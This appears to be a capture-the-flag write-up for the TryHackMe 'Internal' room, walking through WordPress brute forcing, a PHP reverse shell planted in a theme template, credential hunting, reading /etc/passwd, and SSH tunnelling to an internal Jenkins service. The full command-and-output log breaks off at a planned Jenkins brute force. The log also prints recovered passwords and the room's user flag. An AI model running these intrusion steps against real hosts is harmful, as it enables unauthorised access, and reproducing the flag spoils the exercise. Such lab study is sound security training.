https://tryhackme.com/r/room/internal

Scope of Work

The client requests that an engineer conducts an external, web app, and internal assessment of the provided virtual environment. The client has asked that minimal information be provided about the assessment, wanting the engagement conducted from the eyes of a malicious actor (black box penetration test).  The client has asked that you secure two flags (no location provided) as proof of exploitation:

    User.txt
    Root.txt

Additionally, the client has provided the following scope allowances:

    Ensure that you modify your hosts file to reflect internal.thm
    Any tools or techniques are permitted in this engagement
    Locate and note all vulnerabilities found
    Submit the flags discovered to the dashboard
    Only the IP address assigned to your machine is in scope

# Summary

1. Did Port scan and service scan on IP provided, Found SSH and HTTP service running

2. Did `dirb` Dir search for the http and found PHP website, then further found wordpress login page

3. Did bruteforce with `wpscan` for wordpress users and plugins,  found that there exist an admin user

4. did bruteforce for admin user with `wpscan` with rockyou.txy for password,  found credentials

5. Enumerated wordpress after login and found theme editor, injected PHP revershell in it and listened from kali

6. Got the reverseshell as www-data user, did more enumeration anf found credentials of another user aubreanna in a text file in /opt

7. On further enumeration with aubreanna as user found flag user.txt, and found another file with jenkins server internal ip

8. The IP seemed to be docker container ip and also found a containered dir so got confirmed its a jenkis docker container

9. From Kali did a SSH Local port forward to jenkis port since its not directly accesible

10. Accessed jenkins 12.0.0.0:port from kali from browser and found jenkins login page

11. did bruteforce using hydra and found credentials

13. In Jenkins then putted Grrovey revershell and listened on kali, got the shell

14. Enumerated Jenkins and found another file in /opt which had credentials for root user lol!

15. Finllay did SSH using root user and got another flag root.txt

**************************************************************************************************************************

# Port and Service Scan


┌──(kali㉿kali)-[~]
└─$ `ping 10.10.207.150 `
PING 10.10.207.150 (10.10.207.150) 56(84) bytes of data.
64 bytes from 10.10.207.150: icmp_seq=1 ttl=60 time=151 ms
64 bytes from 10.10.207.150: icmp_seq=2 ttl=60 time=146 ms
^C
--- 10.10.207.150 ping statistics ---
2 packets transmitted, 2 received, 0% packet loss, time 1014ms
rtt min/avg/max/mdev = 146.417/148.578/150.739/2.161 ms
                                                                                                                                                                                                                                           
┌──(kali㉿kali)-[~]
└─$ `nmap 10.10.207.150 -T4 -sC -sV -A    `               
Starting Nmap 7.93 ( https://nmap.org ) at 2024-04-21 22:38 EDT
Nmap scan report for 10.10.207.150
Host is up (0.15s latency).
Not shown: 998 closed tcp ports (conn-refused)
PORT   STATE SERVICE VERSION
22/tcp open  ssh     OpenSSH 7.6p1 Ubuntu 4ubuntu0.3 (Ubuntu Linux; protocol 2.0)
| ssh-hostkey: 
|   2048 6efaefbef65f98b9597bf78eb9c5621e (RSA)
|   256 ed64ed33e5c93058ba23040d14eb30e9 (ECDSA)
|_  256 b07f7f7b5262622a60d43d36fa89eeff (ED25519)
80/tcp open  http    Apache httpd 2.4.29 ((Ubuntu))
|_http-title: Apache2 Ubuntu Default Page: It works
|_http-server-header: Apache/2.4.29 (Ubuntu)
Service Info: OS: Linux; CPE: cpe:/o:linux:linux_kernel

Service detection performed. Please report any incorrect resul


`Information Found` 

- SSH  (OpenSSH 7.6) Its not vulnerable, since its newer version
- HTTP 
    - Apache httpd 2.4.29 Its not vulnerable, since its newer version

OS - Linux

# Lets enumerate port 80 first

On Browser http://10.10.207.150/ - We got Apache2 Ubuntu Default page


On Dircectory brute force

┌──(kali㉿kali)-[~]
└─$ `dirb http://10.10.207.150 `  

-----------------
DIRB v2.22    
By The Dark Raver
-----------------

START_TIME: Sun Apr 21 22:45:56 2024
URL_BASE: http://10.10.207.150/
WORDLIST_FILES: /usr/share/dirb/wordlists/common.txt

-----------------

GENERATED WORDS: 4612                                                          

---- Scanning URL: http://10.10.207.150/ ----
==> DIRECTORY: http://10.10.207.150/blog/                                                                                                                                                                                                 
+ http://10.10.207.150/index.html (CODE:200|SIZE:10918)                                                                                                                                                                                   
==> DIRECTORY: http://10.10.207.150/javascript/                                                                                                                                                                                           
==> DIRECTORY: http://10.10.207.150/phpmyadmin/                                                                                                                                                                                           
+ http://10.10.207.150/server-status (CODE:403|SIZE:278)                                                                                                                                                                                  
==> DIRECTORY: http://10.10.207.150/wordpress/                                                                                                                                                                                            
                                                                                                                                                                                                                                          
---- Entering directory: http://10.10.207.150/blog/ ----
+ http://10.10.207.150/blog/index.php (CODE:301|SIZE:0)                                                                                                                                                                                   
==> DIRECTORY: http://10.10.207.150/blog/wp-admin/                                                                                                                                                                                        
==> DIRECTORY: http://10.10.207.150/blog/wp-content/                                                                                                                                                                                      
==> DIRECTORY: http://10.10.207.150/blog/wp-includes/                                                                                                                                                                                     
+ http://10.10.207.150/blog/xmlrpc.php (CODE:405|SIZE:42)     


^C

# Lets enumerate wordpress

┌──(kali㉿kali)-[~]
└─$ `whatweb http://10.10.207.150/wordpress/`
http://10.10.207.150/wordpress/ [404 Not Found] Apache[2.4.29], Country[RESERVED][ZZ], HTML5, HTTPServer[Ubuntu Linux][Apache/2.4.29 (Ubuntu)], IP[10.10.207.150], JQuery, MetaGenerator[WordPress 5.4.2], PoweredBy[WordPress], Script, Title[Page not found &#8211; Internal], UncommonHeaders[link], WordPress[5.4.2]



Further We check on http://10.10.207.150/blog/, we found login page http://internal.thm/blog/wp-login.php

When we use admin/test123  it actully says admin user password is incoreect
When we use test/test123   it dosent say test user password is incorrect, its says invalid usernamer

Hence we are able to enumerate user and we have "admin" as a user

Now lets run `Wpscan` to enumerate plugins `vp` and `u` users


┌──(kali㉿kali)-[~]
└─$ `wpscan --url http://10.10.207.150/blog/ -e vp,u`
_______________________________________________________________
         __          _______   _____
         \ \        / /  __ \ / ____|
          \ \  /\  / /| |__) | (___   ___  __ _ _ __ ®
           \ \/  \/ / |  ___/ \___ \ / __|/ _` | '_ \
            \  /\  /  | |     ____) | (__| (_| | | | |
             \/  \/   |_|    |_____/ \___|\__,_|_| |_|

         WordPress Security Scanner by the WPScan Team
                         Version 3.8.22
                               
       @_WPScan_, @ethicalhack3r, @erwan_lr, @firefart
_______________________________________________________________

[i] Updating the Database ...
[i] Update completed.

[+] URL: http://10.10.207.150/blog/ [10.10.207.150]
[+] Started: Mon Apr 22 00:05:03 2024

Interesting Finding(s):

[+] Headers
 | Interesting Entry: Server: Apache/2.4.29 (Ubuntu)
 | Found By: Headers (Passive Detection)
 | Confidence: 100%

[+] XML-RPC seems to be enabled: http://10.10.207.150/blog/xmlrpc.php
 | Found By: Direct Access (Aggressive Detection)
 | Confidence: 100%
 | References:
 |  - http://codex.wordpress.org/XML-RPC_Pingback_API
 |  - https://www.rapid7.com/db/modules/auxiliary/scanner/http/wordpress_ghost_scanner/
 |  - https://www.rapid7.com/db/modules/auxiliary/dos/http/wordpress_xmlrpc_dos/
 |  - https://www.rapid7.com/db/modules/auxiliary/scanner/http/wordpress_xmlrpc_login/
 |  - https://www.rapid7.com/db/modules/auxiliary/scanner/http/wordpress_pingback_access/

[+] WordPress readme found: http://10.10.207.150/blog/readme.html
 | Found By: Direct Access (Aggressive Detection)
 | Confidence: 100%

[+] The external WP-Cron seems to be enabled: http://10.10.207.150/blog/wp-cron.php
 | Found By: Direct Access (Aggressive Detection)
 | Confidence: 60%
 | References:
 |  - https://www.iplocation.net/defend-wordpress-from-ddos
 |  - https://github.com/wpscanteam/wpscan/issues/1299

[+] WordPress version 5.4.2 identified (Insecure, released on 2020-06-10).
 | Found By: Emoji Settings (Passive Detection)
 |  - http://10.10.207.150/blog/, Match: 'wp-includes\/js\/wp-emoji-release.min.js?ver=5.4.2'
 | Confirmed By: Meta Generator (Passive Detection)
 |  - http://10.10.207.150/blog/, Match: 'WordPress 5.4.2'

[i] The main theme could not be detected.

[+] Enumerating Vulnerable Plugins (via Passive Methods)

[i] No plugins Found.

[+] Enumerating Users (via Passive and Aggressive Methods)
 Brute Forcing Author IDs - Time: 00:00:01 <==============================================================================================================================================================> (10 / 10) 100.00% Time: 00:00:01

[i] User(s) Identified:

[+] admin
 | Found By: Author Id Brute Forcing - Author Pattern (Aggressive Detection)
 | Confirmed By: Login Error Messages (Aggressive Detection)

[!] No WPScan API Token given, as a result vulnerability data has not been output.
[!] You can get a free API token with 25 daily requests by registering at https://wpscan.com/register

[+] Finished: Mon Apr 22 00:05:17 2024
[+] Requests Done: 64
[+] Cached Requests: 5
[+] Data Sent: 14.822 KB
[+] Data Received: 21.33 MB
[+] Memory used: 220.508 MB
[+] Elapsed time: 00:00:13


# Lets bruteforce wordpress with admin user found

┌──(kali㉿kali)-[~]
└─$ `wpscan --url http://10.10.207.150/blog/ --usernames admin --passwords rockyou.txt --max-threads 50`
_______________________________________________________________
         __          _______   _____
         \ \        / /  __ \ / ____|
          \ \  /\  / /| |__) | (___   ___  __ _ _ __ ®
           \ \/  \/ / |  ___/ \___ \ / __|/ _` | '_ \
            \  /\  /  | |     ____) | (__| (_| | | | |
             \/  \/   |_|    |_____/ \___|\__,_|_| |_|

         WordPress Security Scanner by the WPScan Team
                         Version 3.8.22
       Sponsored by Automattic - https://automattic.com/
       @_WPScan_, @ethicalhack3r, @erwan_lr, @firefart
_______________________________________________________________

[+] URL: http://10.10.207.150/blog/ [10.10.207.150]
[+] Started: Mon Apr 22 00:09:19 2024

Interesting Finding(s):

[+] Headers
 | Interesting Entry: Server: Apache/2.4.29 (Ubuntu)
 | Found By: Headers (Passive Detection)
 | Confidence: 100%

[+] XML-RPC seems to be enabled: http://10.10.207.150/blog/xmlrpc.php
 | Found By: Direct Access (Aggressive Detection)
 | Confidence: 100%
 | References:
 |  - http://codex.wordpress.org/XML-RPC_Pingback_API
 |  - https://www.rapid7.com/db/modules/auxiliary/scanner/http/wordpress_ghost_scanner/
 |  - https://www.rapid7.com/db/modules/auxiliary/dos/http/wordpress_xmlrpc_dos/
 |  - https://www.rapid7.com/db/modules/auxiliary/scanner/http/wordpress_xmlrpc_login/
 |  - https://www.rapid7.com/db/modules/auxiliary/scanner/http/wordpress_pingback_access/

[+] WordPress readme found: http://10.10.207.150/blog/readme.html
 | Found By: Direct Access (Aggressive Detection)
 | Confidence: 100%

[+] The external WP-Cron seems to be enabled: http://10.10.207.150/blog/wp-cron.php
 | Found By: Direct Access (Aggressive Detection)
 | Confidence: 60%
 | References:
 |  - https://www.iplocation.net/defend-wordpress-from-ddos
 |  - https://github.com/wpscanteam/wpscan/issues/1299

[+] WordPress version 5.4.2 identified (Insecure, released on 2020-06-10).
 | Found By: Emoji Settings (Passive Detection)
 |  - http://10.10.207.150/blog/, Match: 'wp-includes\/js\/wp-emoji-release.min.js?ver=5.4.2'
 | Confirmed By: Meta Generator (Passive Detection)
 |  - http://10.10.207.150/blog/, Match: 'WordPress 5.4.2'

[i] The main theme could not be detected.

[+] Enumerating All Plugins (via Passive Methods)

[i] No plugins Found.

[+] Enumerating Config Backups (via Passive and Aggressive Methods)
 Checking Config Backups - Time: 00:00:06 <=============================================================================================================================================================> (137 / 137) 100.00% Time: 00:00:06

[i] No Config Backups Found.

[+] Performing password attack on Xmlrpc against 1 user/s
[SUCCESS] - admin / my2boys                                                                                                                                                                                                                 
Trying admin / nguyen Time: 00:01:20 <                                                                                                                                                             > (3900 / 14348292)  0.02%  ETA: ??:??:??

[!] Valid Combinations Found:
 | Username: admin, Password: my2boys

[!] No WPScan API Token given, as a result vulnerability data has not been output.
[!] You can get a free API token with 25 daily requests by registering at https://wpscan.com/register

[+] Finished: Mon Apr 22 00:10:59 2024
[+] Requests Done: 4043
[+] Cached Requests: 28
[+] Data Sent: 2.052 MB
[+] Data Received: 2.319 MB
[+] Memory used: 254.918 MB
[+] Elapsed time: 00:01:40
                              


# we found credentials Username: admin, Password: my2boys

# Now We are able to login as admin, we check for Posts and found something interesting on of the post

<!-- wp:paragraph -->
<p>To-Do</p>
<!-- /wp:paragraph -->

<!-- wp:paragraph -->
<p>Don't forget to reset Will's credentials. william:arnold147</p>
<!-- /wp:paragraph -->

# `!! Oops seems like it was a rabbit hole` nothing as such william exist found after enumeration



# In Wordpress We can often user Theme Editor to create a reverse shell lets try that

We will put our php reversehell on theme editor and start a listener on kali , then we will navigate to page and we should have access

https://github.com/pentestmonkey/php-reverse-shell/blob/master/php-reverse-shell.php

We put reversshell in 404 template in theme editor

Now when we hit http://internal.thm/blog/wp-content/themes/twentyseventeen/404.php, we get the shell on our netcal listner


┌──(kali㉿kali)-[/]
└─$ nc -nvlp 4444        
listening on [any] 4444 ...
connect to [10.17.6.236] from (UNKNOWN) [10.10.207.150] 34388
Linux internal 4.15.0-112-generic #113-Ubuntu SMP Thu Jul 9 23:41:39 UTC 2020 x86_64 x86_64 x86_64 GNU/Linux
 05:03:38 up  2:26,  0 users,  load average: 0.00, 0.00, 0.04
USER     TTY      FROM             LOGIN@   IDLE   JCPU   PCPU WHAT
uid=33(www-data) gid=33(www-data) groups=33(www-data)
/bin/sh: 0: can't access tty; job control turned off
 


`/bin/bash -i`
bash: cannot set terminal process group (1077): Inappropriate ioctl for device
bash: no job control in this shell
www-data@internal:/$ `cat /etc/passwd`
cat /etc/passwd
root:x:0:0:root:/root:/bin/bash
daemon:x:1:1:daemon:/usr/sbin:/usr/sbin/nologin
bin:x:2:2:bin:/bin:/usr/sbin/nologin
sys:x:3:3:sys:/dev:/usr/sbin/nologin
sync:x:4:65534:sync:/bin:/bin/sync
games:x:5:60:games:/usr/games:/usr/sbin/nologin
man:x:6:12:man:/var/cache/man:/usr/sbin/nologin
lp:x:7:7:lp:/var/spool/lpd:/usr/sbin/nologin
mail:x:8:8:mail:/var/mail:/usr/sbin/nologin
news:x:9:9:news:/var/spool/news:/usr/sbin/nologin
uucp:x:10:10:uucp:/var/spool/uucp:/usr/sbin/nologin
proxy:x:13:13:proxy:/bin:/usr/sbin/nologin
www-data:x:33:33:www-data:/var/www:/usr/sbin/nologin
backup:x:34:34:backup:/var/backups:/usr/sbin/nologin
list:x:38:38:Mailing List Manager:/var/list:/usr/sbin/nologin
irc:x:39:39:ircd:/var/run/ircd:/usr/sbin/nologin
gnats:x:41:41:Gnats Bug-Reporting System (admin):/var/lib/gnats:/usr/sbin/nologin
nobody:x:65534:65534:nobody:/nonexistent:/usr/sbin/nologin
systemd-network:x:100:102:systemd Network Management,,,:/run/systemd/netif:/usr/sbin/nologin
systemd-resolve:x:101:103:systemd Resolver,,,:/run/systemd/resolve:/usr/sbin/nologin
syslog:x:102:106::/home/syslog:/usr/sbin/nologin
messagebus:x:103:107::/nonexistent:/usr/sbin/nologin
_apt:x:104:65534::/nonexistent:/usr/sbin/nologin
lxd:x:105:65534::/var/lib/lxd/:/bin/false
uuidd:x:106:110::/run/uuidd:/usr/sbin/nologin
dnsmasq:x:107:65534:dnsmasq,,,:/var/lib/misc:/usr/sbin/nologin
landscape:x:108:112::/var/lib/landscape:/usr/sbin/nologin
pollinate:x:109:1::/var/cache/pollinate:/bin/false
sshd:x:110:65534::/run/sshd:/usr/sbin/nologin
aubreanna:x:1000:1000:aubreanna:/home/aubreanna:/bin/bash
mysql:x:111:114:MySQL Server,,,:/nonexistent:/bin/false
www-data@internal:/$ `sudo -l`
sudo -l
sudo: no tty present and no askpass program specified
www-data@internal:/$ `cat ~/.bash_history`
cat ~/.bash_history
cat: /var/www/.bash_history: No such file or directory
www-data@internal:/$ `cat /etc/sudoers`
cat /etc/sudoers
cat: /etc/sudoers: Permission denied
www-data@internal:/$ `cat /etc/shadow`
cat /etc/shadow


# Lets try to find files with name "wp" considering wordpress, in case we found something more interesting

www-data@internal:/$ `find / -name wp* 2>/dev/null`                                     
find / -name wp* 2>/dev/null
/opt/wp-save.txt
/snap/core/9665/etc/dbus-1/system.d/wpa_supplicant.conf
/snap/core/9665/etc/network/if-down.d/wpasupplicant
/snap/core/9665/etc/network/if-post-down.d/wpasupplicant
/snap/core/9665/etc/network/if-pre-up.d/wpasupplicant
/snap/core/9665/etc/network/if-up.d/wpasupplicant
/snap/core/9665/etc/wpa_supplicant
/snap/core/9665/lib/systemd/system/wpa_supplicant.service
/snap/core/9665/lib/systemd/system/wpa_supplicant.service.d
/snap/core/9665/lib/systemd/system-sleep/wpasupplicant
/snap/core/9665/sbin/wpa_action
/snap/core/9665/sbin/wpa_cli
/snap/core/9665/sbin/wpa_supplicant
/snap/core/9665/usr/bin/wpa_passphrase
/snap/core/9665/usr/share/doc/wpa_supplicant
/snap/core/9665/usr/share/doc/wpasupplicant
/snap/core/8268/etc/dbus-1/system.d/wpa_supplicant.conf
/snap/core/8268/etc/network/if-down.d/wpasupplicant
/snap/core/8268/etc/network/if-post-down.d/wpasupplicant
/snap/core/8268/etc/network/if-pre-up.d/wpasupplicant
/snap/core/8268/etc/network/if-up.d/wpasupplicant
/snap/core/8268/etc/wpa_supplicant
/snap/core/8268/lib/systemd/system/wpa_supplicant.service
/snap/core/8268/lib/systemd/system/wpa_supplicant.service.d
/snap/core/8268/lib/systemd/system-sleep/wpasupplicant
/snap/core/8268/sbin/wpa_action
/snap/core/8268/sbin/wpa_cli
/snap/core/8268/sbin/wpa_supplicant
/snap/core/8268/usr/bin/wpa_passphrase
/snap/core/8268/usr/share/doc/wpa_supplicant
/snap/core/8268/usr/share/doc/wpasupplicant
/var/www/html/wordpress/wp-blog-header.php
/var/www/html/wordpress/wp-login.php
/var/www/html/wordpress/wp-signup.php
/var/www/html/wordpress/wp-settings.php
/var/www/html/wordpress/wp-admin
/var/www/html/wordpress/wp-admin/images/wpspin_light.gif
/var/www/html/wordpress/wp-admin/images/wpspin_light-2x.gif
/var/www/html/wordpress/wp-admin/css/wp-admin.css
/var/www/html/wordpress/wp-admin/css/wp-admin-rtl.css
/var/www/html/wordpress/wp-admin/css/wp-admin-rtl.min.css
/var/www/html/wordpress/wp-admin/css/wp-admin.min.css
/var/www/html/wordpress/wp-includes
/var/www/html/wordpress/wp-includes/images/wpicons-2x.png
/var/www/html/wordpress/wp-includes/images/wpicons.png
/var/www/html/wordpress/wp-includes/images/wpspin-2x.gif
/var/www/html/wordpress/wp-includes/images/wlw/wp-icon.png
/var/www/html/wordpress/wp-includes/images/wlw/wp-comments.png
/var/www/html/wordpress/wp-includes/images/wlw/wp-watermark.png
/var/www/html/wordpress/wp-includes/images/wpspin.gif
/var/www/html/wordpress/wp-includes/wp-db.php
/var/www/html/wordpress/wp-includes/wp-diff.php
/var/www/html/wordpress/wp-includes/js/wplink.js
/var/www/html/wordpress/wp-includes/js/wp-pointer.js
/var/www/html/wordpress/wp-includes/js/wp-list-revisions.js
/var/www/html/wordpress/wp-includes/js/wp-emoji.js
/var/www/html/wordpress/wp-includes/js/wp-util.js
/var/www/html/wordpress/wp-includes/js/wp-custom-header.min.js
/var/www/html/wordpress/wp-includes/js/wp-emoji.min.js
/var/www/html/wordpress/wp-includes/js/wp-api.js
/var/www/html/wordpress/wp-includes/js/wp-pointer.min.js
/var/www/html/wordpress/wp-includes/js/wp-backbone.js
/var/www/html/wordpress/wp-includes/js/wp-embed-template.min.js
/var/www/html/wordpress/wp-includes/js/wp-util.min.js
/var/www/html/wordpress/wp-includes/js/wp-sanitize.min.js
/var/www/html/wordpress/wp-includes/js/wp-backbone.min.js
/var/www/html/wordpress/wp-includes/js/wp-embed-template.js
/var/www/html/wordpress/wp-includes/js/dist/vendor/wp-polyfill.min.js
/var/www/html/wordpress/wp-includes/js/dist/vendor/wp-polyfill-dom-rect.js
/var/www/html/wordpress/wp-includes/js/dist/vendor/wp-polyfill-fetch.min.js
/var/www/html/wordpress/wp-includes/js/dist/vendor/wp-polyfill-url.min.js
/var/www/html/wordpress/wp-includes/js/dist/vendor/wp-polyfill-dom-rect.min.js
/var/www/html/wordpress/wp-includes/js/dist/vendor/wp-polyfill-formdata.js
/var/www/html/wordpress/wp-includes/js/dist/vendor/wp-polyfill-element-closest.js
/var/www/html/wordpress/wp-includes/js/dist/vendor/wp-polyfill.js
/var/www/html/wordpress/wp-includes/js/dist/vendor/wp-polyfill-node-contains.min.js
/var/www/html/wordpress/wp-includes/js/dist/vendor/wp-polyfill-element-closest.min.js
/var/www/html/wordpress/wp-includes/js/dist/vendor/wp-polyfill-fetch.js
/var/www/html/wordpress/wp-includes/js/dist/vendor/wp-polyfill-url.js
/var/www/html/wordpress/wp-includes/js/dist/vendor/wp-polyfill-node-contains.js
/var/www/html/wordpress/wp-includes/js/dist/vendor/wp-polyfill-formdata.min.js
/var/www/html/wordpress/wp-includes/js/wp-emoji-loader.js
/var/www/html/wordpress/wp-includes/js/wp-api.min.js
/var/www/html/wordpress/wp-includes/js/wp-auth-check.min.js
/var/www/html/wordpress/wp-includes/js/wp-ajax-response.js
/var/www/html/wordpress/wp-includes/js/plupload/wp-plupload.min.js
/var/www/html/wordpress/wp-includes/js/plupload/wp-plupload.js
/var/www/html/wordpress/wp-includes/js/wp-sanitize.js
/var/www/html/wordpress/wp-includes/js/wp-lists.js
/var/www/html/wordpress/wp-includes/js/wp-auth-check.js
/var/www/html/wordpress/wp-includes/js/wpdialog.min.js
/var/www/html/wordpress/wp-includes/js/wp-custom-header.js
/var/www/html/wordpress/wp-includes/js/wp-list-revisions.min.js
/var/www/html/wordpress/wp-includes/js/wp-embed.min.js
/var/www/html/wordpress/wp-includes/js/wp-lists.min.js
/var/www/html/wordpress/wp-includes/js/wp-ajax-response.min.js
/var/www/html/wordpress/wp-includes/js/wp-embed.js
/var/www/html/wordpress/wp-includes/js/mediaelement/wp-mediaelement.js
/var/www/html/wordpress/wp-includes/js/mediaelement/wp-playlist.min.js
/var/www/html/wordpress/wp-includes/js/mediaelement/wp-mediaelement.css
/var/www/html/wordpress/wp-includes/js/mediaelement/wp-mediaelement.min.js
/var/www/html/wordpress/wp-includes/js/mediaelement/wp-playlist.js
/var/www/html/wordpress/wp-includes/js/mediaelement/wp-mediaelement.min.css
/var/www/html/wordpress/wp-includes/js/wp-emoji-loader.min.js
/var/www/html/wordpress/wp-includes/js/wplink.min.js
/var/www/html/wordpress/wp-includes/js/wp-emoji-release.min.js
/var/www/html/wordpress/wp-includes/js/wpdialog.js
/var/www/html/wordpress/wp-includes/js/tinymce/wp-tinymce.js
/var/www/html/wordpress/wp-includes/js/tinymce/skins/wordpress/wp-content.css
/var/www/html/wordpress/wp-includes/js/tinymce/wp-tinymce.php
/var/www/html/wordpress/wp-includes/js/tinymce/plugins/wptextpattern
/var/www/html/wordpress/wp-includes/js/tinymce/plugins/wpdialogs
/var/www/html/wordpress/wp-includes/js/tinymce/plugins/wpemoji
/var/www/html/wordpress/wp-includes/js/tinymce/plugins/wplink
/var/www/html/wordpress/wp-includes/js/tinymce/plugins/wpautoresize
/var/www/html/wordpress/wp-includes/js/tinymce/plugins/wpview
/var/www/html/wordpress/wp-includes/js/tinymce/plugins/wpeditimage
/var/www/html/wordpress/wp-includes/js/tinymce/plugins/wpgallery
/var/www/html/wordpress/wp-includes/js/tinymce/langs/wp-langs-en.js
/var/www/html/wordpress/wp-includes/css/wp-embed-template-ie.min.css
/var/www/html/wordpress/wp-includes/css/wp-pointer.css
/var/www/html/wordpress/wp-includes/css/wp-auth-check-rtl.css
/var/www/html/wordpress/wp-includes/css/wp-auth-check.min.css
/var/www/html/wordpress/wp-includes/css/wp-auth-check-rtl.min.css
/var/www/html/wordpress/wp-includes/css/wp-pointer-rtl.css
/var/www/html/wordpress/wp-includes/css/wp-pointer-rtl.min.css
/var/www/html/wordpress/wp-includes/css/wp-embed-template.min.css
/var/www/html/wordpress/wp-includes/css/wp-pointer.min.css
/var/www/html/wordpress/wp-includes/css/wp-embed-template-ie.css
/var/www/html/wordpress/wp-includes/css/wp-embed-template.css
/var/www/html/wordpress/wp-includes/css/wp-auth-check.css
/var/www/html/wordpress/wp-mail.php
/var/www/html/wordpress/wp-trackback.php
/var/www/html/wordpress/wp-links-opml.php
/var/www/html/wordpress/wp-activate.php
/var/www/html/wordpress/wp-cron.php
/var/www/html/wordpress/wp-load.php
/var/www/html/wordpress/wp-comments-post.php
/var/www/html/wordpress/wp-config-sample.php
/var/www/html/wordpress/wp-config.php
/var/www/html/wordpress/wp-content
/var/lib/wordpress/wp-content
/lib/modules/4.15.0-112-generic/kernel/crypto/wp512.ko
/usr/share/doc/netplan/examples/wpa_enterprise.yaml
/usr/src/linux-headers-4.15.0-112-generic/include/config/crypto/wp512.h
/usr/src/linux-headers-4.15.0-112-generic/include/config/carl9170/wpc.h
www-data@internal:/$ 


# Apart from some common wordpress directories we found `/opt/wp-save.txt` lets check

www-data@internal:/$ `cd opt`
www-data@internal:/opt$ `ls -al`
ls -al
total 16
drwxr-xr-x  3 root root 4096 Aug  3  2020 .
drwxr-xr-x 24 root root 4096 Aug  3  2020 ..
drwx--x--x  4 root root 4096 Aug  3  2020 containerd
-rw-r--r--  1 root root  138 Aug  3  2020 wp-save.txt
www-data@internal:/opt$ cat wp-save.txt
cat wp-save.txt
Bill,

Aubreanna needed these credentials for something later.  Let her know you have them and where they are.

aubreanna:bubb13guM!@#123
www-data@internal:/opt$   
www-data@internal:/opt$ `cd containerd `
cd containerd
www-data@internal:/opt/containerd$ `ls -al`
ls -al
ls: cannot open directory '.': Permission denied
www-data@internal:/opt/containerd$ 


# we got credentials of another user,  lets switch to it and check containered dir, since currently we cant see

www-data@internal:/opt/containerd$ `su aubreanna`
su aubreanna
su: must be run from a terminal

# Its not allwing saying must be run from terminal, lets use python to spwn terminal once

www-data@internal:/opt/containerd$ `python -c 'import pty; pty.spawn("/bin/sh")'`
`id`
id
uid=33(www-data) gid=33(www-data) groups=33(www-data)
`/bin/bash -i`
/bin/bash -i
www-data@internal:/opt/containerd$ `su aubreanna`
su aubreanna
Password: bubb13guM!@#123

aubreanna@internal:/opt/containerd$ `ls -al`
ls -al
ls: cannot open directory '.': Permission denied
aubreanna@internal:/opt/containerd$ 

# Lets enumerate more with this user, if some way we can escalate privileges
# Note we can also SSH from this user

Lets search for the "user.txt" flag, if its there

aubreanna@internal:/home$ `find / -name "user.txt" 2>/dev/null`
find / -name "user.txt" 2>/dev/null
/home/aubreanna/user.txt
/usr/share/doc/phpmyadmin/html/_sources/user.txt
aubreanna@internal:/home$ 
aubreanna@internal:/home$ `cd /home/aubreanna`
cd /home/aubreanna
aubreanna@internal:~$ `ls`
ls
jenkins.txt  snap  user.txt
aubreanna@internal:~$ `cat user.txt`
cat user.txt
THM{int3rna1_fl4g_1}
aubreanna@internal:~$ 

# We also find a jenkins.txt lets check

aubreanna@internal:~$ `cat jenkins.txt`
cat jenkins.txt
Internal Jenkins service is running on 172.17.0.2:8080
aubreanna@internal:~$ 


# And We found an internal jenkins servic IP `This is common docer service ip - 172.17.0.2`!!

aubreanna@internal:~$ `ping 172.17.0.2`
ping 172.17.0.2
PING 172.17.0.2 (172.17.0.2) 56(84) bytes of data.
64 bytes from 172.17.0.2: icmp_seq=1 ttl=64 time=0.041 ms
64 bytes from 172.17.0.2: icmp_seq=2 ttl=64 time=0.052 ms
64 bytes from 172.17.0.2: icmp_seq=3 ttl=64 time=0.052 ms
^C

# OOPS I mistakenly closed shell, bu no worry we now simpoly ssh using user we found

┌──(kali㉿kali)-[~]
└─$ `ssh aubreanna@10.10.52.46`                                                                            
The authenticity of host '10.10.52.46 (10.10.52.46)' can't be established.
ED25519 key fingerprint is SHA256:seRYczfyDrkweytt6CJT/aBCJZMIcvlYYrTgoGxeHs4.
This host key is known by the following other names/addresses:
    ~/.ssh/known_hosts:58: [hashed name]
Are you sure you want to continue connecting (yes/no/[fingerprint])? yes
Warning: Permanently added '10.10.52.46' (ED25519) to the list of known hosts.
aubreanna@10.10.52.46's password: 
Welcome to Ubuntu 18.04.4 LTS (GNU/Linux 4.15.0-112-generic x86_64)

 * Documentation:  https://help.ubuntu.com
 * Management:     https://landscape.canonical.com
 * Support:        https://ubuntu.com/advantage

  System information as of Tue Apr 23 03:48:59 UTC 2024

  System load:  0.0               Processes:              124
  Usage of /:   63.7% of 8.79GB   Users logged in:        0
  Memory usage: 46%               IP address for eth0:    10.10.52.46
  Swap usage:   0%                IP address for docker0: 172.17.0.1

  => There is 1 zombie process.


 * Canonical Livepatch is available for installation.
   - Reduce system reboots and improve kernel security. Activate at:
     https://ubuntu.com/livepatch

0 packages can be updated.
0 updates are security updates.


Last login: Mon Aug  3 19:56:19 2020 from 10.6.2.56
aubreanna@internal:~$ `id`
uid=1000(aubreanna) gid=1000(aubreanna) groups=1000(aubreanna),4(adm),24(cdrom),30(dip),46(plugdev)
aubreanna@internal:~$ `cd /home/aubreanna`
aubreanna@internal:~$ `ls`
jenkins.txt  snap  user.txt
aubreanna@internal:~$ `cd snap`
aubreanna@internal:~/snap$ `ls`
docker
aubreanna@internal:~/snap$ `cd docker`
aubreanna@internal:~/snap/docker$ `ls`
current

# We find there is docker container

# Lets access the Jenkins service runnin on 8080 from our kali machine by simple SSH tunnel port forward

┌──(kali㉿kali)-[~]
└─$ `ssh -L 8080:172.17.0.2:8080  aubreanna@10.10.52.46`
aubreanna@10.10.52.46's password: 
Welcome to Ubuntu 18.04.4 LTS (GNU/Linux 4.15.0-112-generic x86_64)

 * Documentation:  https://help.ubuntu.com
 * Management:     https://landscape.canonical.com
 * Support:        https://ubuntu.com/advantage

  System information as of Tue Apr 23 03:57:47 UTC 2024

  System load:  0.0               Processes:              124
  Usage of /:   63.7% of 8.79GB   Users logged in:        0
  Memory usage: 46%               IP address for eth0:    10.10.52.46
  Swap usage:   0%                IP address for docker0: 172.17.0.1

  => There is 1 zombie process.


 * Canonical Livepatch is available for installation.
   - Reduce system reboots and improve kernel security. Activate at:
     https://ubuntu.com/livepatch

0 packages can be updated.
0 updates are security updates.

Failed to connect to https://changelogs.ubuntu.com/meta-release-lts. Check your Internet connection or proxy settings


Last login: Tue Apr 23 03:49:00 2024 from 10.17.6.236
aubreanna@internal:~$ 


# Now if we go to browser and hit `http://127.0.0.1:8080/` we get jenkins login page

# lets brute force login page

┌──(kali㉿kali)-[~]
